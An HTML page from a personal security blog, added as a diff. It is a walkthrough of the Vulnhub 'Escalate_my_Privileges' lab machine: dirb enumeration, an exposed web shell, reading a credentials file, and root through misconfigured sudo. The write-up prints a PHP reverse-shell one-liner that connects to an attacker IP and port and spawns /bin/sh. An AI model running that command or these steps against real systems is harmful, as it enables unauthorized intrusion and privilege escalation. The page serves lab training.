@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    
+        <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@300&family=Montserrat:wght@300&family=Sacramento&display=swap" rel="stylesheet">
+        
+        <link rel="stylesheet" type="text/css" href="../css/style.css">
+        <link rel="stylesheet" type="text/css" href="../css/style-writeup.css">
+        
+        <title>7s26simon</title>
+        
+    </head>    
+    
+    <body>
+        
+        <div id="top"></div>
+        
+       <div id="top-bar-blue">
+
+            <h1 id="name-font">Simon McCabe</h1>
+
+            <h4>WAPT. OSCP. OSWP. PGCert. BSc. Linux+. Security+.</h4>
+
+            <img id="cloud-one" src="../images/cloud.png" height="50" width="100" alt="cloud">
+
+            <img id="cloud-two" src="../images/cloud.png" height="50" width="100" alt="cloud">  
+
+        </div>
+
+        <div class="topnav">
+
+          <a class="active" href="/index.html">Home</a>
+          <a href="/hackthebox.html">HackTheBox</a>
+          <a href="/tryhackme.html">TryHackMe</a>
+          <a href="/vulnhub.html">Vulnhub</a>
+          <a href="/general.html">General Security</a>
+          <a href="/personal.html">Personal</a>
+          <a href="/About.html">About Me</a>
+
+        </div>
+        
+        <div id="writeup-box-name">
+
+            <p>...Escalate_my_Privileges Writeup...</p>
+
+        </div>
+
+        <div id="center-writeup-image">
+
+            <img src="/images/vulnhub/escalate_my_privileges/main.png" alt="vulnhub">
+            
+        </div>  
+        
+<div id="marg-asthetic">
+        
+        <h2>1. Enumeration</h2>
+        
+        <p>First, I ran dirb and it identified a few interesting directories to get me started.</p>
+    
+        <img src="/images/vulnhub/escalate_my_privileges/1dirb.PNG" alt="vulnhub">
+    
+        <p>I went to the phpbash.php file first, as this sounded the most interesting:</p>
+        
+        <img src="/images/vulnhub/escalate_my_privileges/1.PNG" alt="vulnhub">
+    
+        <p>It turns out that there's a nice web-based shell we can use. Nice and secure, huh?!</p>
+    
+        <p>I went over to <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest-monkey</a> and used the php reverse shell to get a connection on my attacking VM.</p>
+        
+        <div class="code-view-two"><pre><b>apache@my_privilege:/backup/armour#<br>php -r &apos;$sock=fsockopen(&quot;192.168.1.100&quot;,4444)&semi;exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;amp&semi;3&quot;)&semi;&apos;
+        </b></pre></div>
+    
+        <p>As expected, I was running as apache. For some reason, every command I typed doubled-up, so id became iidd, but it still worked:</p>
+        
+        <img src="/images/vulnhub/escalate_my_privileges/2.PNG" alt="vulnhub">
+    
+        <p>From here, I went into the /home directory, and saw a user called "armour". In the armour directory, there was a file called "Credentials.txt". Inside it said: "md5(rootroot1)". </p>
+    
+        <img src="/images/vulnhub/escalate_my_privileges/3.PNG" alt="vulnhub">
+        
+        <p>Next I switched user to "armour" and used the md5 hash as the password. I was now "armour":</p>
+    
+        <img src="/images/vulnhub/escalate_my_privileges/4.PNG" alt="vulnhub">
+    
+        <h2>2. Privilege Escalation</h2>
+
+        <p>I ran "sudo -l" and noticed that a few things seemed mis-configured!</p>
+
+        <img src="/images/vulnhub/escalate_my_privileges/5.PNG" alt="vulnhub">  
+
+        <p>I ran: "sudo /bin/sh" and I was now root:</p> 
+
+        <img src="/images/vulnhub/escalate_my_privileges/6.PNG" alt="vulnhub">
+
+        <p>I looked to see whether the root user had a flag, and it did:</p>
+
+        <img src="/images/vulnhub/escalate_my_privileges/7.PNG" alt="vulnhub">
+    
+<p>And that was that. Nice basic box. Thanks <a href="https://twitter.com/@akankshavermasv">Akanksha</a> for the challenge!</p>
+    
+<p><a href="#top">Go to top</a></p></div>
+    
+        <div id="social-media">
+
+            <a class="logoWidth" href="https://www.linkedin.com/in/simcc/" target="_blank">
+            <img src="../images/linkedin.PNG" width="25" height="25" alt="linkedin"></a>
+
+            <a class="logoWidth" href="http://twitter.com/7s26simon" target="_blank">
+            <img src="../images/twitter.PNG" width="30" height="25" alt="twitter"></a>
+
+            <a class="logoWidth" href="https://www.youtube.com/channel/UCp8Iiw5FjmwDXKLV91t-j3Q" target="_blank">
+            <img src="../images/youtube.PNG" width="30" height="25" alt="youtube"></a> 
+
+        </div>
+
+        <div id="bottom-bar" >
+
+            <div id="validator">
+
+            <a href="https://validator.w3.org/check?uri=referer"><img
+                  src="http://www.w3.org/Icons/valid-xhtml10"
+                  alt="Valid XHTML 1.0!" height="31" width="88" /></a>
+
+            <p id="footerTag">© 2020 Simon McCabe - 7s26simon.github.io</p>
+
+            </div>
+
+        </div>
+        
+    </body>
+
+</html>
